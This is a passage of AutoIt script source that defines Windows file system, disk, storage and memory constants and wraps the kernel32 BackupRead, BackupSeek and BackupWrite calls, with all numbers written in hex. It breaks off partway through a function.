Global Const $FSCTL_FILESYSTEM_GET_STATISTICS = 0x90060
Global Const $FSCTL_FIND_FILES_BY_SID = 0x9008f
Global Const $FSCTL_GET_COMPRESSION = 0x9003c
Global Const $FSCTL_GET_NTFS_FILE_RECORD = 0x90068
Global Const $FSCTL_GET_NTFS_VOLUME_DATA = 0x90064
Global Const $FSCTL_GET_OBJECT_ID = 0x9009c
Global Const $FSCTL_GET_REPARSE_POINT = 0x900a8
Global Const $FSCTL_GET_RETRIEVAL_POINTERS = 0x90073
Global Const $FSCTL_GET_VOLUME_BITMAP = 0x9006f
Global Const $FSCTL_HSM_DATA = 0x9c113
Global Const $FSCTL_HSM_MSG = 0x9c108
Global Const $FSCTL_INVALIDATE_VOLUMES = 0x90054
Global Const $FSCTL_IS_PATHNAME_VALID = 0x9002c
Global Const $FSCTL_IS_VOLUME_DIRTY = 0x90078
Global Const $FSCTL_IS_VOLUME_MOUNTED = 0x90028
Global Const $FSCTL_LOCK_VOLUME = 0x90018
Global Const $FSCTL_MARK_AS_SYSTEM_HIVE = 0x9004f
Global Const $FSCTL_MARK_HANDLE = 0x900fc
Global Const $FSCTL_MARK_VOLUME_DIRTY = 0x90030
Global Const $FSCTL_MOVE_FILE = 0x90074
Global Const $FSCTL_OPBATCH_ACK_CLOSE_PENDING = 0x90010
Global Const $FSCTL_OPLOCK_BREAK_ACK_NO_2 = 0x90050
Global Const $FSCTL_OPLOCK_BREAK_ACKNOWLEDGE = 0x9000c
Global Const $FSCTL_OPLOCK_BREAK_NOTIFY = 0x90014
Global Const $FSCTL_QUERY_ALLOCATED_RANGES = 0x940cf
Global Const $FSCTL_QUERY_FAT_BPB = 0x90058
Global Const $FSCTL_QUERY_RETRIEVAL_POINTERS = 0x9003b
Global Const $FSCTL_QUERY_USN_JOURNAL = 0x900f4
Global Const $FSCTL_READ_FILE_USN_DATA = 0x900eb
Global Const $FSCTL_READ_PROPERTY_DATA = 0x90087
Global Const $FSCTL_READ_RAW_ENCRYPTED = 0x900e3
Global Const $FSCTL_READ_USN_JOURNAL = 0x900bb
Global Const $FSCTL_RECALL_FILE = 0x90117
Global Const $FSCTL_REQUEST_BATCH_OPLOCK = 0x90008
Global Const $FSCTL_REQUEST_FILTER_OPLOCK = 0x9005c
Global Const $FSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x90000
Global Const $FSCTL_REQUEST_OPLOCK_LEVEL_2 = 0x90004
Global Const $FSCTL_SECURITY_ID_CHECK = 0x940b7
Global Const $FSCTL_SET_COMPRESSION = 0x9c040
Global Const $FSCTL_SET_ENCRYPTION = 0x900d7
Global Const $FSCTL_SET_OBJECT_ID = 0x90098
Global Const $FSCTL_SET_OBJECT_ID_EXTENDED = 0x900bc
Global Const $FSCTL_SET_REPARSE_POINT = 0x900a4
Global Const $FSCTL_SET_SPARSE = 0x900c4
Global Const $FSCTL_SET_ZERO_DATA = 0x980c8
Global Const $FSCTL_SIS_COPYFILE = 0x90100
Global Const $FSCTL_SIS_LINK_FILES = 0x9c104
Global Const $FSCTL_UNLOCK_VOLUME = 0x9001c
Global Const $FSCTL_WRITE_PROPERTY_DATA = 0x9008b
Global Const $FSCTL_WRITE_RAW_ENCRYPTED = 0x900df
Global Const $FSCTL_WRITE_USN_CLOSE_RECORD = 0x900ef
Global Const $IOCTL_AACS_END_SESSION = 0x3350cc
Global Const $IOCTL_AACS_GENERATE_BINDING_NONCE = 0x33d0f0
Global Const $IOCTL_AACS_GET_CERTIFICATE = 0x3350d4
Global Const $IOCTL_AACS_GET_CHALLENGE_KEY = 0x3350d8
Global Const $IOCTL_AACS_READ_BINDING_NONCE = 0x3350ec
Global Const $IOCTL_AACS_READ_MEDIA_ID = 0x3350e8
Global Const $IOCTL_AACS_READ_MEDIA_KEY_BLOCK = 0x3350c4
Global Const $IOCTL_AACS_READ_MEDIA_KEY_BLOCK_SIZE = 0x3350c0
Global Const $IOCTL_AACS_READ_SERIAL_NUMBER = 0x3350e4
Global Const $IOCTL_AACS_READ_VOLUME_ID = 0x3350e0
Global Const $IOCTL_AACS_SEND_CERTIFICATE = 0x3350d0
Global Const $IOCTL_AACS_SEND_CHALLENGE_KEY = 0x3350dc
Global Const $IOCTL_AACS_START_SESSION = 0x3350c8
Global Const $IOCTL_ATA_PASS_THROUGH = 0x4d02c
Global Const $IOCTL_ATA_PASS_THROUGH_DIRECT = 0x4d030
Global Const $IOCTL_CDROM_CHECK_VERIFY = 0x24800
Global Const $IOCTL_CDROM_DISK_TYPE = 0x20040
Global Const $IOCTL_CDROM_EJECT_MEDIA = 0x24808
Global Const $IOCTL_CDROM_FIND_NEW_DEVICES = 0x24818
Global Const $IOCTL_CDROM_GET_CONFIGURATION = 0x24058
Global Const $IOCTL_CDROM_GET_CONTROL = 0x24034
Global Const $IOCTL_CDROM_GET_DRIVE_GEOMETRY = 0x2404c
Global Const $IOCTL_CDROM_GET_DRIVE_GEOMETRY_EX = 0x24050
Global Const $IOCTL_CDROM_GET_LAST_SESSION = 0x24038
Global Const $IOCTL_CDROM_GET_VOLUME = 0x24014
Global Const $IOCTL_CDROM_LOAD_MEDIA = 0x2480c
Global Const $IOCTL_CDROM_MEDIA_REMOVAL = 0x24804
Global Const $IOCTL_CDROM_PAUSE_AUDIO = 0x2400c
Global Const $IOCTL_CDROM_PLAY_AUDIO_MSF = 0x24018
Global Const $IOCTL_CDROM_RAW_READ = 0x2403e
Global Const $IOCTL_CDROM_READ_Q_CHANNEL = 0x2402c
Global Const $IOCTL_CDROM_READ_TOC = 0x24000
Global Const $IOCTL_CDROM_READ_TOC_EX = 0x24054
Global Const $IOCTL_CDROM_RELEASE = 0x24814
Global Const $IOCTL_CDROM_RESERVE = 0x24810
Global Const $IOCTL_CDROM_RESUME_AUDIO = 0x24010
Global Const $IOCTL_CDROM_SEEK_AUDIO_MSF = 0x24004
Global Const $IOCTL_CDROM_SET_VOLUME = 0x24028
Global Const $IOCTL_CDROM_STOP_AUDIO = 0x24008
Global Const $IOCTL_CDROM_UNLOAD_DRIVER = 0x25008
Global Const $IOCTL_DISK_CHECK_VERIFY = 0x74800
Global Const $IOCTL_DISK_CONTROLLER_NUMBER = 0x70044
Global Const $IOCTL_DISK_CREATE_DISK = 0x7c058
Global Const $IOCTL_DISK_DELETE_DRIVE_LAYOUT = 0x7c100
Global Const $IOCTL_DISK_EJECT_MEDIA = 0x74808
Global Const $IOCTL_DISK_FIND_NEW_DEVICES = 0x74818
Global Const $IOCTL_DISK_FORMAT_TRACKS = 0x7c018
Global Const $IOCTL_DISK_FORMAT_TRACKS_EX = 0x7c02c
Global Const $IOCTL_DISK_GET_CACHE_INFORMATION = 0x740d4
Global Const $IOCTL_DISK_GET_DRIVE_GEOMETRY = 0x70000
Global Const $IOCTL_DISK_GET_DRIVE_GEOMETRY_EX = 0x700a0
Global Const $IOCTL_DISK_GET_DRIVE_LAYOUT = 0x7400c
Global Const $IOCTL_DISK_GET_DRIVE_LAYOUT_EX = 0x70050
Global Const $IOCTL_DISK_GET_LENGTH_INFO = 0x7405c
Global Const $IOCTL_DISK_GET_MEDIA_TYPES = 0x70c00
Global Const $IOCTL_DISK_GET_PARTITION_INFO = 0x74004
Global Const $IOCTL_DISK_GET_PARTITION_INFO_EX = 0x70048
Global Const $IOCTL_DISK_GET_WRITE_CACHE_STATE = 0x740dc
Global Const $IOCTL_DISK_GROW_PARTITION = 0x7c0d0
Global Const $IOCTL_DISK_HISTOGRAM_DATA = 0x70034
Global Const $IOCTL_DISK_HISTOGRAM_RESET = 0x70038
Global Const $IOCTL_DISK_HISTOGRAM_STRUCTURE = 0x70030
Global Const $IOCTL_DISK_INTERNAL_CLEAR_VERIFY = 0x70407
Global Const $IOCTL_DISK_INTERNAL_SET_NOTIFY = 0x70408
Global Const $IOCTL_DISK_INTERNAL_SET_VERIFY = 0x70403
Global Const $IOCTL_DISK_IS_WRITABLE = 0x70024
Global Const $IOCTL_DISK_LOAD_MEDIA = 0x7480c
Global Const $IOCTL_DISK_LOGGING = 0x70028
Global Const $IOCTL_DISK_MEDIA_REMOVAL = 0x74804
Global Const $IOCTL_DISK_PERFORMANCE = 0x70020
Global Const $IOCTL_DISK_PERFORMANCE_OFF = 0x70060
Global Const $IOCTL_DISK_REASSIGN_BLOCKS = 0x7c01c
Global Const $IOCTL_DISK_RELEASE = 0x74814
Global Const $IOCTL_DISK_REQUEST_DATA = 0x70040
Global Const $IOCTL_DISK_REQUEST_STRUCTURE = 0x7003c
Global Const $IOCTL_DISK_RESERVE = 0x74810
Global Const $IOCTL_DISK_SET_CACHE_INFORMATION = 0x7c0d8
Global Const $IOCTL_DISK_SET_DRIVE_LAYOUT = 0x7c010
Global Const $IOCTL_DISK_SET_DRIVE_LAYOUT_EX = 0x7c054
Global Const $IOCTL_DISK_SET_PARTITION_INFO = 0x7c008
Global Const $IOCTL_DISK_SET_PARTITION_INFO_EX = 0x7c04c
Global Const $IOCTL_DISK_UPDATE_DRIVE_SIZE = 0x7c0c8
Global Const $IOCTL_DISK_UPDATE_PROPERTIES = 0x70140
Global Const $IOCTL_DISK_VERIFY = 0x70014
Global Const $IOCTL_DVD_END_SESSION = 0x33500c
Global Const $IOCTL_DVD_GET_REGION = 0x335014
Global Const $IOCTL_DVD_READ_KEY = 0x335004
Global Const $IOCTL_DVD_READ_STRUCTURE = 0x335140
Global Const $IOCTL_DVD_SEND_KEY = 0x335008
Global Const $IOCTL_DVD_SEND_KEY2 = 0x33d018
Global Const $IOCTL_DVD_SET_READ_AHEAD = 0x335010
Global Const $IOCTL_DVD_START_SESSION = 0x335000
Global Const $IOCTL_MOUNTDEV_LINK_CREATED = 0x4d0010
Global Const $IOCTL_MOUNTDEV_LINK_DELETED = 0x4d0014
Global Const $IOCTL_MOUNTDEV_QUERY_STABLE_GUID = 0x4d0018
Global Const $IOCTL_MOUNTDEV_QUERY_SUGGESTED_LINK_NAME = 0x4d000c
Global Const $IOCTL_MOUNTDEV_QUERY_UNIQUE_ID = 0x4d0000
Global Const $IOCTL_MOUNTDEV_UNIQUE_ID_CHANGE_NOTIFY = 0x4d0004
Global Const $IOCTL_MOUNTMGR_AUTO_DL_ASSIGNMENTS = 0x6dc014
Global Const $IOCTL_MOUNTMGR_CHANGE_NOTIFY = 0x6d4020
Global Const $IOCTL_MOUNTMGR_CHECK_UNPROCESSED_VOLUMES = 0x6d4028
Global Const $IOCTL_MOUNTMGR_CREATE_POINT = 0x6dc000
Global Const $IOCTL_MOUNTMGR_DELETE_POINTS = 0x6dc004
Global Const $IOCTL_MOUNTMGR_DELETE_POINTS_DBONLY = 0x6dc00c
Global Const $IOCTL_MOUNTMGR_KEEP_LINKS_WHEN_OFFLINE = 0x6dc024
Global Const $IOCTL_MOUNTMGR_NEXT_DRIVE_LETTER = 0x6dc010
Global Const $IOCTL_MOUNTMGR_QUERY_DOS_VOLUME_PATH = 0x6d0030
Global Const $IOCTL_MOUNTMGR_QUERY_DOS_VOLUME_PATHS = 0x6d0034
Global Const $IOCTL_MOUNTMGR_QUERY_POINTS = 0x6d0008
Global Const $IOCTL_MOUNTMGR_VOLUME_ARRIVAL_NOTIFICATION = 0x6d402c
Global Const $IOCTL_MOUNTMGR_VOLUME_MOUNT_POINT_CREATED = 0x6dc018
Global Const $IOCTL_MOUNTMGR_VOLUME_MOUNT_POINT_DELETED = 0x6dc01c
Global Const $IOCTL_SCSI_GET_INQUIRY_DATA = 0x4100c
Global Const $IOCTL_SCSI_GET_CAPABILITIES = 0x41010
Global Const $IOCTL_SCSI_GET_ADDRESS = 0x41018
Global Const $IOCTL_SCSI_MINIPORT = 0x4d008
Global Const $IOCTL_SCSI_PASS_THROUGH = 0x4d004
Global Const $IOCTL_SCSI_PASS_THROUGH_DIRECT = 0x4d014
Global Const $IOCTL_SCSI_RESCAN_BUS = 0x4101c
Global Const $IOCTL_STORAGE_BREAK_RESERVATION = 0x2d5014
Global Const $IOCTL_STORAGE_CHECK_VERIFY = 0x2d4800
Global Const $IOCTL_STORAGE_CHECK_VERIFY2 = 0x2d0800
Global Const $IOCTL_STORAGE_EJECT_MEDIA = 0x2d4808
Global Const $IOCTL_STORAGE_EJECTION_CONTROL = 0x2d0940
Global Const $IOCTL_STORAGE_FIND_NEW_DEVICES = 0x2d4818
Global Const $IOCTL_STORAGE_GET_DEVICE_NUMBER = 0x2d1080
Global Const $IOCTL_STORAGE_GET_HOTPLUG_INFO = 0x2d0c14
Global Const $IOCTL_STORAGE_GET_MEDIA_SERIAL_NUMBER = 0x2d0c10
Global Const $IOCTL_STORAGE_GET_MEDIA_TYPES = 0x2d0c00
Global Const $IOCTL_STORAGE_GET_MEDIA_TYPES_EX = 0x2d0c04
Global Const $IOCTL_STORAGE_LOAD_MEDIA = 0x2d480c
Global Const $IOCTL_STORAGE_LOAD_MEDIA2 = 0x2d080c
Global Const $IOCTL_STORAGE_MANAGE_DATA_SET_ATTRIBUTES = 0x2d9404
Global Const $IOCTL_STORAGE_MCN_CONTROL = 0x2d0944
Global Const $IOCTL_STORAGE_MEDIA_REMOVAL = 0x2d4804
Global Const $IOCTL_STORAGE_PERSISTENT_RESERVE_IN = 0x2d5018
Global Const $IOCTL_STORAGE_PERSISTENT_RESERVE_OUT = 0x2d501c
Global Const $IOCTL_STORAGE_PREDICT_FAILURE = 0x2d1100
Global Const $IOCTL_STORAGE_QUERY_PROPERTY = 0x2d1400
Global Const $IOCTL_STORAGE_RELEASE = 0x2d4814
Global Const $IOCTL_STORAGE_RESERVE = 0x2d4810
Global Const $IOCTL_STORAGE_RESET_BUS = 0x2d5000
Global Const $IOCTL_STORAGE_RESET_DEVICE = 0x2d5004
Global Const $IOCTL_STORAGE_SET_HOTPLUG_INFO = 0x2dcc18
Global Const $IOCTL_STORAGE_SET_READ_AHEAD = 0x2d4400
Global Const $IOCTL_VOLUME_GET_GPT_ATTRIBUTES = 0x560038
Global Const $IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS = 0x560000
Global Const $IOCTL_VOLUME_IS_CLUSTERED = 0x560030
Global Const $IOCTL_VOLUME_IS_IO_CAPABLE = 0x560014
Global Const $IOCTL_VOLUME_IS_OFFLINE = 0x560010
Global Const $IOCTL_VOLUME_IS_PARTITION = 0x560028
Global Const $IOCTL_VOLUME_LOGICAL_TO_PHYSICAL = 0x560020
Global Const $IOCTL_VOLUME_OFFLINE = 0x56c00c
Global Const $IOCTL_VOLUME_ONLINE = 0x56c008
Global Const $IOCTL_VOLUME_PHYSICAL_TO_LOGICAL = 0x560024
Global Const $IOCTL_VOLUME_QUERY_FAILOVER_SET = 0x560018
Global Const $IOCTL_VOLUME_QUERY_VOLUME_NUMBER = 0x56001c
Global Const $IOCTL_VOLUME_READ_PLEX = 0x56402e
Global Const $IOCTL_VOLUME_SET_GPT_ATTRIBUTES = 0x560034
Global Const $IOCTL_VOLUME_SUPPORTS_ONLINE_OFFLINE = 0x560004
Global Const $SMART_GET_VERSION = 0x74080
Global Const $SMART_RCV_DRIVE_DATA = 0x7c088
Global Const $SMART_SEND_DRIVE_COMMAND = 0x7c084
Global Const $FILE_ENCRYPTABLE = 0x0
Global Const $FILE_IS_ENCRYPTED = 0x1
Global Const $FILE_READ_ONLY = 0x8
Global Const $FILE_ROOT_DIR = 0x3
Global Const $FILE_SYSTEM_ATTR = 0x2
Global Const $FILE_SYSTEM_DIR = 0x4
Global Const $FILE_SYSTEM_NOT_SUPPORT = 0x6
Global Const $FILE_UNKNOWN = 0x5
Global Const $FILE_USER_DISALLOWED = 0x7
Global Const $SCS_32BIT_BINARY = 0x0
Global Const $SCS_64BIT_BINARY = 0x6
Global Const $SCS_DOS_BINARY = 0x1
Global Const $SCS_OS216_BINARY = 0x5
Global Const $SCS_PIF_BINARY = 0x3
Global Const $SCS_POSIX_BINARY = 0x4
Global Const $SCS_WOW_BINARY = 0x2
Global Const $DRIVE_BUS_TYPE_UNKNOWN = 0x0
Global Const $DRIVE_BUS_TYPE_SCSI = 0x1
Global Const $DRIVE_BUS_TYPE_ATAPI = 0x2
Global Const $DRIVE_BUS_TYPE_ATA = 0x3
Global Const $DRIVE_BUS_TYPE_1394 = 0x4
Global Const $DRIVE_BUS_TYPE_SSA = 0x5
Global Const $DRIVE_BUS_TYPE_FIBRE = 0x6
Global Const $DRIVE_BUS_TYPE_USB = 0x7
Global Const $DRIVE_BUS_TYPE_RAID = 0x8
Global Const $DRIVE_BUS_TYPE_ISCSI = 0x9
Global Const $DRIVE_BUS_TYPE_SAS = 0xa
Global Const $DRIVE_BUS_TYPE_SATA = 0xb
Global Const $DRIVE_BUS_TYPE_SD = 0xc
Global Const $DRIVE_BUS_TYPE_MMC = 0xd
Global Const $DRIVE_UNKNOWN = 0x0
Global Const $DRIVE_NO_ROOT_DIR = 0x1
Global Const $DRIVE_REMOVABLE = 0x2
Global Const $DRIVE_FIXED = 0x3
Global Const $DRIVE_REMOTE = 0x4
Global Const $DRIVE_CDROM = 0x5
Global Const $DRIVE_RAMDISK = 0x6
Global Const $FILE_TYPE_CHAR = 0x2
Global Const $FILE_TYPE_DISK = 0x1
Global Const $FILE_TYPE_PIPE = 0x3
Global Const $FILE_TYPE_REMOTE = 0x8000
Global Const $FILE_TYPE_UNKNOWN = 0x0
Global Const $FILE_NAME_NORMALIZED = 0x0
Global Const $FILE_NAME_OPENED = 0x8
Global Const $VOLUME_NAME_DOS = 0x0
Global Const $VOLUME_NAME_GUID = 0x1
Global Const $VOLUME_NAME_NONE = 0x4
Global Const $VOLUME_NAME_NT = 0x2
Global Const $IMAGE_FILE_MACHINE_UNKNOWN = 0x0
Global Const $IMAGE_FILE_MACHINE_AM33 = 0x1d3
Global Const $IMAGE_FILE_MACHINE_AMD64 = 0x8664
Global Const $IMAGE_FILE_MACHINE_ARM = 0x1c0
Global Const $IMAGE_FILE_MACHINE_EBC = 0xebc
Global Const $IMAGE_FILE_MACHINE_I386 = 0x14c
Global Const $IMAGE_FILE_MACHINE_IA64 = 0x200
Global Const $IMAGE_FILE_MACHINE_M32R = 0x9041
Global Const $IMAGE_FILE_MACHINE_MIPS16 = 0x266
Global Const $IMAGE_FILE_MACHINE_MIPSFPU = 0x366
Global Const $IMAGE_FILE_MACHINE_MIPSFPU16 = 0x466
Global Const $IMAGE_FILE_MACHINE_POWERPC = 0x1f0
Global Const $IMAGE_FILE_MACHINE_POWERPCFP = 0x1f1
Global Const $IMAGE_FILE_MACHINE_R4000 = 0x166
Global Const $IMAGE_FILE_MACHINE_SH3 = 0x1a2
Global Const $IMAGE_FILE_MACHINE_SH3DSP = 0x1a3
Global Const $IMAGE_FILE_MACHINE_SH4 = 0x1a6
Global Const $IMAGE_FILE_MACHINE_SH5 = 0x1a8
Global Const $IMAGE_FILE_MACHINE_THUMB = 0x1c2
Global Const $IMAGE_FILE_MACHINE_WCEMIPSV2 = 0x169
Global Const $FILE_CASE_PRESERVED_NAMES = 0x2
Global Const $FILE_CASE_SENSITIVE_SEARCH = 0x1
Global Const $FILE_FILE_COMPRESSION = 0x10
Global Const $FILE_NAMED_STREAMS = 0x40000
Global Const $FILE_PERSISTENT_ACLS = 0x8
Global Const $FILE_READ_ONLY_VOLUME = 0x80000
Global Const $FILE_SEQUENTIAL_WRITE_ONCE = 0x100000
Global Const $FILE_SUPPORTS_ENCRYPTION = 0x20000
Global Const $FILE_SUPPORTS_EXTENDED_ATTRIBUTES = 0x800000
Global Const $FILE_SUPPORTS_HARD_LINKS = 0x400000
Global Const $FILE_SUPPORTS_OBJECT_IDS = 0x10000
Global Const $FILE_SUPPORTS_OPEN_BY_FILE_ID = 0x1000000
Global Const $FILE_SUPPORTS_REPARSE_POINTS = 0x80
Global Const $FILE_SUPPORTS_SPARSE_FILES = 0x40
Global Const $FILE_SUPPORTS_TRANSACTIONS = 0x200000
Global Const $FILE_SUPPORTS_USN_JOURNAL = 0x2000000
Global Const $FILE_UNICODE_ON_DISK = 0x4
Global Const $FILE_VOLUME_IS_COMPRESSED = 0x8000
Global Const $FILE_VOLUME_QUOTAS = 0x20
Global Const $FILE_DEVICE_8042_PORT = 0x27
Global Const $FILE_DEVICE_ACPI = 0x32
Global Const $FILE_DEVICE_BATTERY = 0x29
Global Const $FILE_DEVICE_BEEP = 0x1
Global Const $FILE_DEVICE_BUS_EXTENDER = 0x2a
Global Const $FILE_DEVICE_CD_ROM = 0x2
Global Const $FILE_DEVICE_CD_ROM_FILE_SYSTEM = 0x3
Global Const $FILE_DEVICE_CHANGER = 0x30
Global Const $FILE_DEVICE_CONTROLLER = 0x4
Global Const $FILE_DEVICE_DATALINK = 0x5
Global Const $FILE_DEVICE_DFS = 0x6
Global Const $FILE_DEVICE_DFS_FILE_SYSTEM = 0x35
Global Const $FILE_DEVICE_DFS_VOLUME = 0x36
Global Const $FILE_DEVICE_DISK = 0x7
Global Const $FILE_DEVICE_DISK_FILE_SYSTEM = 0x8
Global Const $FILE_DEVICE_DVD = 0x33
Global Const $FILE_DEVICE_FILE_SYSTEM = 0x9
Global Const $FILE_DEVICE_FIPS = 0x3a
Global Const $FILE_DEVICE_FULLSCREEN_VIDEO = 0x34
Global Const $FILE_DEVICE_INPORT_PORT = 0xa
Global Const $FILE_DEVICE_KEYBOARD = 0xb
Global Const $FILE_DEVICE_KS = 0x2f
Global Const $FILE_DEVICE_KSEC = 0x39
Global Const $FILE_DEVICE_MAILSLOT = 0xc
Global Const $FILE_DEVICE_MASS_STORAGE = 0x2d
Global Const $FILE_DEVICE_MIDI_IN = 0xd
Global Const $FILE_DEVICE_MIDI_OUT = 0xe
Global Const $FILE_DEVICE_MODEM = 0x2b
Global Const $FILE_DEVICE_MOUSE = 0xf
Global Const $FILE_DEVICE_MULTI_UNC_PROVIDER = 0x10
Global Const $FILE_DEVICE_NAMED_PIPE = 0x11
Global Const $FILE_DEVICE_NETWORK = 0x12
Global Const $FILE_DEVICE_NETWORK_BROWSER = 0x13
Global Const $FILE_DEVICE_NETWORK_FILE_SYSTEM = 0x14
Global Const $FILE_DEVICE_NETWORK_REDIRECTOR = 0x28
Global Const $FILE_DEVICE_NULL = 0x15
Global Const $FILE_DEVICE_PARALLEL_PORT = 0x16
Global Const $FILE_DEVICE_PHYSICAL_NETCARD = 0x17
Global Const $FILE_DEVICE_PRINTER = 0x18
Global Const $FILE_DEVICE_SCANNER = 0x19
Global Const $FILE_DEVICE_SCREEN = 0x1c
Global Const $FILE_DEVICE_SERENUM = 0x37
Global Const $FILE_DEVICE_SERIAL_MOUSE_PORT = 0x1a
Global Const $FILE_DEVICE_SERIAL_PORT = 0x1b
Global Const $FILE_DEVICE_SMARTCARD = 0x31
Global Const $FILE_DEVICE_SMB = 0x2e
Global Const $FILE_DEVICE_SOUND = 0x1d
Global Const $FILE_DEVICE_STREAMS = 0x1e
Global Const $FILE_DEVICE_TAPE = 0x1f
Global Const $FILE_DEVICE_TAPE_FILE_SYSTEM = 0x20
Global Const $FILE_DEVICE_TERMSRV = 0x38
Global Const $FILE_DEVICE_TRANSPORT = 0x21
Global Const $FILE_DEVICE_UNKNOWN = 0x22
Global Const $FILE_DEVICE_VDM = 0x2c
Global Const $FILE_DEVICE_VIDEO = 0x23
Global Const $FILE_DEVICE_VIRTUAL_DISK = 0x24
Global Const $FILE_DEVICE_WAVE_IN = 0x25
Global Const $FILE_DEVICE_WAVE_OUT = 0x26
Global Const $FILE_ANY_ACCESS = 0x0
Global Const $FILE_SPECIAL_ACCESS = $FILE_ANY_ACCESS
Global Const $FILE_READ_ACCESS = 0x1
Global Const $FILE_WRITE_ACCESS = 0x2
Global Const $METHOD_BUFFERED = 0x0
Global Const $METHOD_IN_DIRECT = 0x1
Global Const $METHOD_OUT_DIRECT = 0x2
Global Const $METHOD_NEITHER = 0x3
Global Const $FILE_NOTIFY_CHANGE_FILE_NAME = 0x1
Global Const $FILE_NOTIFY_CHANGE_DIR_NAME = 0x2
Global Const $FILE_NOTIFY_CHANGE_ATTRIBUTES = 0x4
Global Const $FILE_NOTIFY_CHANGE_SIZE = 0x8
Global Const $FILE_NOTIFY_CHANGE_LAST_WRITE = 0x10
Global Const $FILE_NOTIFY_CHANGE_LAST_ACCESS = 0x20
Global Const $FILE_NOTIFY_CHANGE_CREATION = 0x40
Global Const $FILE_NOTIFY_CHANGE_SECURITY = 0x100
Global Const $FILE_ACTION_ADDED = 0x1
Global Const $FILE_ACTION_REMOVED = 0x2
Global Const $FILE_ACTION_MODIFIED = 0x3
Global Const $FILE_ACTION_RENAMED_OLD_NAME = 0x4
Global Const $FILE_ACTION_RENAMED_NEW_NAME = 0x5
Global Const $REPLACEFILE_WRITE_THROUGH = 0x1
Global Const $REPLACEFILE_IGNORE_MERGE_ERRORS = 0x2
Global Const $REPLACEFILE_IGNORE_ACL_ERRORS = 0x4
Global Const $BASE_SEARCH_PATH_ENABLE_SAFE_SEARCHMODE = 0x1
Global Const $BASE_SEARCH_PATH_DISABLE_SAFE_SEARCHMODE = 0x10000
Global Const $BASE_SEARCH_PATH_PERMANENT = 0x8000
Global Const $GMEM_FIXED = 0x0
Global Const $GMEM_MOVEABLE = 0x2
Global Const $GMEM_NOCOMPACT = 0x10
Global Const $GMEM_NODISCARD = 0x20
Global Const $GMEM_ZEROINIT = 0x40
Global Const $GMEM_MODIFY = 0x80
Global Const $GMEM_DISCARDABLE = 0x100
Global Const $GMEM_NOT_BANKED = 0x1000
Global Const $GMEM_SHARE = 0x2000
Global Const $GMEM_DDESHARE = 0x2000
Global Const $GMEM_NOTIFY = 0x4000
Global Const $GMEM_LOWER = 0x1000
Global Const $GMEM_VALID_FLAGS = 0x7f72
Global Const $GMEM_INVALID_HANDLE = 0x8000
Global Const $GPTR = BitOR($GMEM_FIXED, $GMEM_ZEROINIT)
Global Const $GHND = BitOR($GMEM_MOVEABLE, $GMEM_ZEROINIT)
Global Const $MEM_COMMIT = 0x1000
Global Const $MEM_RESERVE = 0x2000
Global Const $MEM_TOP_DOWN = 0x100000
Global Const $MEM_SHARED = 0x8000000
Global Const $PAGE_NOACCESS = 0x1
Global Const $PAGE_READONLY = 0x2
Global Const $PAGE_READWRITE = 0x4
Global Const $PAGE_EXECUTE = 0x10
Global Const $PAGE_EXECUTE_READ = 0x20
Global Const $PAGE_EXECUTE_READWRITE = 0x40
Global Const $PAGE_EXECUTE_WRITECOPY = 0x80
Global Const $PAGE_GUARD = 0x100
Global Const $PAGE_NOCACHE = 0x200
Global Const $PAGE_WRITECOMBINE = 0x400
Global Const $PAGE_WRITECOPY = 0x8
Global Const $MEM_DECOMMIT = 0x4000
Global Const $MEM_RELEASE = 0x8000
Global Enum $MEM_LOAD, $MEM_TOTALPHYSRAM, $MEM_AVAILPHYSRAM, $MEM_TOTALPAGEFILE, $MEM_AVAILPAGEFILE, $MEM_TOTALVIRTUAL, $MEM_AVAILVIRTUAL
#Region Global Variables and Constants
    Global $__g_iheapsize = 0x800000
    Global Const $TAGFILEINFO = "uint64 CreationTime;uint64 LastAccessTime;uint64 LastWriteTime;uint64 ChangeTime;dword Attributes"
    Global Const $TAGFILE_ID_DESCRIPTOR = "dword Size;uint Type;" & $TAGGUID
    Global Const $TAGWIN32_FIND_STREAM_DATA = "int64 StreamSize;wchar StreamName[296]"
    Global Const $TAGWIN32_STREAM_ID = "dword StreamId;dword StreamAttributes;int64 Size;dword StreamNameSize;wchar StreamName[1]"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_BackupRead($hfile, $pbuffer, $ilength, ByRef $ibytes, ByRef $pcontext, $bsecurity = False)
        $ibytes = 0x0
        Local $acall = DllCall("kernel32.dll", "bool", "BackupRead", "handle", $hfile, "struct*", $pbuffer, "dword", $ilength, "dword*", 0x0, "bool", 0x0, "bool", $bsecurity, "ptr*", $pcontext)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
        $ibytes = $acall[0x4]
        $pcontext = $acall[0x7]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BackupRead

    Func _WinAPI_BackupReadAbort(ByRef $pcontext)
        Local $acall = DllCall("kernel32.dll", "bool", "BackupRead", "handle", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "bool", 0x1, "bool", 0x0, "ptr*", $pcontext)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
        $pcontext = $acall[0x7]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BackupReadAbort

    Func _WinAPI_BackupSeek($hfile, $iseek, ByRef $ibytes, ByRef $pcontext)
        $ibytes = 0x0
        Local $acall = DllCall("kernel32.dll", "bool", "BackupSeek", "handle", $hfile, "dword", _WinAPI_LoDWord($iseek), "dword", _WinAPI_HiDWord($iseek), "dword*", 0x0, "dword*", 0x0, "ptr*", $pcontext)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
        $ibytes = __WinAPI_MakeQWord($acall[0x4], $acall[0x5])
        $pcontext = $acall[0x6]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BackupSeek

    Func _WinAPI_BackupWrite($hfile, $pbuffer, $ilength, ByRef $ibytes, ByRef $pcontext, $bsecurity = False)
        $ibytes = 0x0
        Local $acall = DllCall("kernel32.dll", "bool", "BackupWrite", "handle", $hfile, "struct*", $pbuffer, "dword", $ilength, "dword*", 0x0, "bool", 0x0, "bool", $bsecurity, "ptr*", $pcontext)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
        $ibytes = $acall[0x4]
        $pcontext = $acall[0x7]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BackupWrite

    Func _WinAPI_BackupWriteAbort(ByRef $pcontext)
